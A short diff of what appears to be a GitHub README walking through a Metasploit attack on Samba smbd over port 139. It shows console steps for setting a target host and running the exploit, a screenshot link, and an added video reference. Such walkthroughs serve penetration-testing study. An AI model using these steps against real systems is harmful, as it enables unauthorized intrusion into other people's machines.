@@ -19,3 +19,5 @@
 9.msf 6 > set RHOST (target ip)
 10.msf 6 > exploit
 ![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/8fcb8276-efda-4b13-b718-3927c305f34a)
+
+Referance form : https://www.youtube.com/watch?v=Eqsilc8HoPI
